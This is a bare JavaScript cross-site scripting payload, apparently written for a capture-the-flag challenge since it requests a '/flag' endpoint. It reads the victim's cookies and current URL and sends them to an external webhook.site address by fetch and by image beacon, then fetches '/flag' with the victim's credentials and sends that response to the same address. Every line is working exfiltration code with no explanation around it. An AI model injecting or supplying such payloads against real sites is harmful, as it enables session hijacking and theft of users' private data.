var w = 'https://webhook.site/d06624a7-0585-4a81-971a-d41dd30e1dcb';
var c = document.cookie;
var l = location.href;

// Method 1: fetch with cookies
fetch(w + '?c=' + encodeURIComponent(c) + '&u=' + encodeURIComponent(l));

// Method 2: img beacon fallback
new Image().src = w + '?c=' + encodeURIComponent(c) + '&u=' + encodeURIComponent(l);

// Method 3: try fetching /flag endpoint
fetch('/flag', {credentials: 'include'})
  .then(r => r.text())
  .then(t => fetch(w + '?flag=' + encodeURIComponent(t)));
